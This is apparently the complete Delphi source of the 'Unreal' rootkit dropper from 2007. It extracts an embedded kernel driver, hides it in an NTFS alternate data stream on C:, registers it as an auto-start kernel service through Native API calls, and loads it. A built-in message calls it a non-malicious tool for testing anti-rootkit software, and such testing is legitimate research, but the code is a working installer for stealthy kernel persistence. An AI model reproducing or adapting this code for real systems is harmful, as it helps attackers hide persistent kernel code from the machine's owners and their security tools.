{$E EXE}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}

{$IFDEF minimum}
program Unreal;
{$ENDIF}
unit Unreal;
interface
implementation

uses
  Windows, WinNative, commctrl, Messages, WinSvc2, RTL;

{$R Res1.res}

type
  PEXCEPTION_POINTERS = ^_EXCEPTION_POINTERS;


const
  IOPortServiceFilePath: PWideChar = '\??\C:\:unreal.sys';
  IOPortServiceFilePath2: PWideChar = 'C:\:unreal.sys';
  IOPortServiceKey: PWideChar = '\REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Services\unreal';
  RegKey1: PWideChar = 'SYSTEM\CurrentControlSet\Services\unreal';
  RegKey2: PWideChar = '\Enum';
  str_ImagePath: PWideChar = 'ImagePath';
  str_ErrorControl: PWideChar = 'ErrorControl';
  str_Start: PWideChar = 'Start';
  str_Type: PWideChar = 'Type';

var
  prev: boolean;
  osver: OSVERSIONINFOW;
  MutexHandle: THANDLE;
  hinst: DWORD;
  CurrentDirectory: LBuf;
  MainWindow: HWND = 0;
  quit: boolean = false;

function Unreal_DeleteFile(const FileName: PWideChar): boolean;
begin
  result := DeleteFileW(FileName);
  if FileExistsW(FileName) then
  begin
    Sleep(1000);
    result := DeleteFileW(FileName);
  end;
end;

function Unreal_IsNTFS(lpFileName: PWideChar): integer;
var
  fsname: LBuf;
  disk_buf: LBuf;
  l, fsfl: DWORD;
begin
  memzero(@fsname, sizeof(fsname));
  memzero(@disk_buf, sizeof(disk_buf));
  strcpynW(disk_buf, lpFileName, sizeof(WCHAR));
  strcatW(disk_buf, '\');
  GetVolumeInformationW(@disk_buf[0], nil, 0, nil, l, fsfl, fsname, MAX_PATH);
  result := strcmpiW(fsname, 'NTFS');
end;

procedure GetCurrentDirectoryFromPEB();
var
  pBuf: PROCESS_BASIC_INFORMATION;
  bytesIO: DWORD;
begin
  bytesIO := 0;
  ZwQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, @pBuf, sizeof(PROCESS_BASIC_INFORMATION), @bytesIO);
  ExtractFilePathW(pBuf.PebBaseAddress^.ProcessParameters^.ImagePathName.PStr, CurrentDirectory);
end;

procedure LoadServiceDriver(fLoad: boolean);
var
  drvkey: THANDLE;
  dat1: DWORD;
  attr: OBJECT_ATTRIBUTES;
  fname: UNICODE_STRING;
begin
  RtlInitUnicodeString(@fname, IOPortServiceKey);

  attr.Length := sizeof(OBJECT_ATTRIBUTES);
  attr.RootDirectory := 0;
  attr.ObjectName := @fname;
  attr.Attributes := 0;
  attr.SecurityDescriptor := nil;
  attr.SecurityQualityOfService := nil;

  if ZwCreateKey(drvkey, KEY_ALL_ACCESS, @attr, 0,
    nil, REG_OPTION_NON_VOLATILE, nil) <> STATUS_SUCCESS then exit;
  dat1 := SERVICE_ERROR_NORMAL;
  RtlInitUnicodeString(@fname, str_ErrorControl);
  ZwSetValueKey(drvkey, @fname, 0, REG_DWORD, @dat1, sizeof(DWORD));
  dat1 := SERVICE_AUTO_START;
  RtlInitUnicodeString(@fname, str_Start);
  ZwSetValueKey(drvkey, @fname, 0, REG_DWORD, @dat1, sizeof(DWORD));
  dat1 := SERVICE_KERNEL_DRIVER;
  RtlInitUnicodeString(@fname, str_Type);
  ZwSetValueKey(drvkey, @fname, 0, REG_DWORD, @dat1, sizeof(DWORD));
  RtlInitUnicodeString(@fname, str_ImagePath);
  ZwSetValueKey(drvkey, @fname, 0, REG_SZ, IOPortServiceFilePath,
    (strlenW(IOPortServiceFilePath) + 1) * sizeof(WideChar));
  RtlInitUnicodeString(@fname, IOPortServiceKey);
  if fLoad then
    dat1 := ZwLoadDriver(@fname)
  else
    ZwUnLoadDriver(@fname);
  ZwClose(drvkey);
end;

procedure Unreal_DropFile();
var
  f: THANDLE;
  iost: IO_STATUS_BLOCK;
  attr: OBJECT_ATTRIBUTES;
  fname: UNICODE_STRING;
  offset1: LARGE_INTEGER;
  hRes: HRSRC;
  hResData: HGLOBAL;
  p1: pointer;
  size: cardinal;
begin
  hRes := FindResourceW(hinst, 'UNREAL', 'BINRES');
  if (hRes = 0) then exit;
  size := SizeOfResource(hinst, hRes);
  if (size = 0) then exit;
  hResData := LoadResource(hinst, hRes);
  if (hResData = 0) then exit;
  p1 := LockResource(hResData);
  if (p1 = nil) then exit;

  RtlInitUnicodeString(@fname, IOPortServiceFilePath);

  attr.Length := sizeof(OBJECT_ATTRIBUTES);
  attr.RootDirectory := 0;
  attr.ObjectName := @fname;
  attr.Attributes := OBJ_CASE_INSENSITIVE;
  attr.SecurityDescriptor := nil;
  attr.SecurityQualityOfService := nil;

  f := 0;
  if (ZwCreateFile(@f, FILE_WRITE_ACCESS or SYNCHRONIZE, @attr,
    @iost, nil, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ or FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
    FILE_SYNCHRONOUS_IO_NONALERT or FILE_NON_DIRECTORY_FILE, nil, 0) = STATUS_SUCCESS) then
  begin
    offset1.QuadPart := 0;
    ZwWriteFile(f, 0, nil, nil, @iost, p1, size, @offset1, nil);
    ZwClose(f);
  end;

  LoadServiceDriver(false);
  LoadServiceDriver(true);
end;

const
  Msg1: PWideChar = '"Unreal" rootkit hides file and driver.'#13#10 +
  'Works on NT-based operation systems with NTFS File System.'#13#10 +
    'Your disk C: should be NTFS'#13#10 +
    ' !This rootkit is NOT Malicious! '#13#10 +
    'This rootkit is not intended to be runned with HIPS'#13#10 +
    'ONLY for tests with modern AntiRootkit software'#13#10 +
    '(c) 2007 MP_ART && EP_X0FF';

var
  LB: HWND = 0;

function MainWindowProc(hwndDlg: HWND; uMsg: UINT; wParam: WPARAM;
  lParam: LPARAM): BOOL; stdcall;
var
  disp: DWORD;
  skey: HKEY;
  buf: LBuf;
  b: boolean;
begin
  result := false;
  case uMsg of
    WM_INITDIALOG:
      begin
        LB := GetDlgItem(hwndDlg, 666);
        SetWindowTextW(LB, Msg1);
      end;
    WM_CLOSE:
      begin
        EndDialog(hwndDlg, S_OK);
        quit := true;
        exit;
      end;
    WM_COMMAND:
      case LoWord(WParam) of
        1000:
          begin
            if (Unreal_IsNTFS('C:\') <> 0) then
            begin
              MessageBoxW(hwndDlg, 'Unsupported file system, we need backdoor-friendly NTFS', nil, MB_ICONERROR);
              exit;
            end;
            Unreal_DropFile();
            MessageBoxW(hwndDlg, 'Ok, check rootkit presence with DbgView', '', MB_OK);
            exit;
          end;
        1001:
          begin
            if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, Regkey1, 0, nil,
              REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, nil, skey, @disp) <> ERROR_SUCCESS) then
            begin
              MessageBoxW(hwndDlg, 'Rootkit not installed or already unistalled (uninstall in a progress)', nil, MB_ICONINFORMATION);
              exit;
            end;
            RegCloseKey(skey);
            strcpyW(buf, RegKey1);
            strcatW(buf, RegKey2);
            b := (RegDeleteKeyW(HKEY_LOCAL_MACHINE, buf) = ERROR_SUCCESS) and
            (RegDeleteKeyW(HKEY_LOCAL_MACHINE, Regkey1) = ERROR_SUCCESS);
            if b then MessageBoxW(hwndDlg, 'Reg Entry deleted successfully'#13#10'Reboot now and use this function ' +
                'again to remove rootkit file!', 'Ok', MB_OK);
            if Unreal_DeleteFile(IOPortServiceFilePath2) then MessageBoxW(hwndDlg, 'Uninstall complete', ':)', MB_OK);
            exit;
          end;
        8:
          begin
            EndDialog(hwndDlg, S_OK);
            quit := true;
            exit;
          end;
      end;
  end;
end;

procedure GUImain();
var
  msg1: MSG;
begin
  MainWindow := CreateDialogParamW(0, pointer(101), 0, @MainWindowProc, 0);
  while GetMessageW(msg1, 0, 0, 0) do
  begin
    TranslateMessage(msg1);
    DispatchMessageW(msg1);
    if quit then
    begin
      DestroyWindow(MainWindow);
      break;
    end;
  end;
end;

function OnException(ExceptionInfo: PEXCEPTION_POINTERS): LONGINT; stdcall;
var
  textbuf: array[0..1023] of WCHAR;
begin
  CloseHandle(MutexHandle);
  strcpyW(textbuf, 'Sorry, but unhandled exception has occured'#13#10'Program will be terminated'#13#10);
  with ExceptionInfo^.ExceptionRecord^ do
  begin
    strcatW(textbuf, 'Exception code : 0x');
    uitohexW(ExceptionCode, strendW(textbuf));
    strcatW(textbuf, #13#10'Instruction address : 0x');
    uitohexW(DWORD(ExceptionAddress), strendW(textbuf));
    if ExceptionCode = EXCEPTION_ACCESS_VIOLATION then
    begin
      case ExceptionInformation[0] of
        0: strcatW(textbuf, #13#10'Attempt to read at address  : 0x');
        1: strcatW(textbuf, #13#10'Attempt to write at address : 0x');
      end;
      uitohexW(ExceptionInformation[1], strendW(textbuf));
    end;
  end;
  MessageBoxW(MainWindow, textbuf, nil, MB_ICONERROR or MB_SYSTEMMODAL);
  ZwTerminateProcess(GetCurrentProcess(), $DEAD);
  result := 0;
end;

begin
  SetLastError(0);
  MutexHandle := CreateMutexW(nil, false, '< Unreal > Dropper in the work');
  if (GetLastError() = ERROR_ALREADY_EXISTS) then ExitProcess(0);
  SetUnhandledExceptionFilter(@OnException);

  if (RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, @prev) <> STATUS_SUCCESS) then
  begin
    MessageBoxW(0, 'Error, load driver privilege not adjusted', nil, MB_ICONWARNING);
    ExitProcess(0);
  end;
  osver.dwOSVersionInfoSize := sizeof(osver);
  Windows.GetVersionExW(osver);
  if (osver.dwMajorVersion > 5) then
  begin
    MessageBoxW(0, 'Not supported Windows NT version, click OK to exit', nil, MB_OK or MB_ICONERROR);
    ExitProcess(0);
  end;
  hinst := GetModuleHandleW(nil);
  InitCommonControls();
  GUImain();
  CloseHandle(MutexHandle);
  ExitProcess(0);
end.

